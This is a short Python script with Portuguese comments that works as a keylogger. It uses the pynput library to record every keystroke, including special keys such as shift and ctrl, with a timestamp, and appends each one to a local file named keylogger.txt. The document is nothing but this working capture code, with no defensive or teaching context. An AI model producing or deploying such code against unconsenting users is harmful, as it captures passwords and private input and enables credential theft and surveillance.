from pynput import keyboard
import datetime

def on_press(key):
    try:
        # Registra a tecla pressionada e o horário
        with open("keylogger.txt", "a") as logfile:
            logfile.write(f"{datetime.datetime.now()}: {key.char}\n")
    except AttributeError:
        # Registra teclas especiais (ex. shift, ctrl, etc)
        with open("keylogger.txt", "a") as logfile:
            logfile.write(f"{datetime.datetime.now()}: {key} (tecla especial)\n")

def on_release(key):
    pass

# Inicia o listener do teclado
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
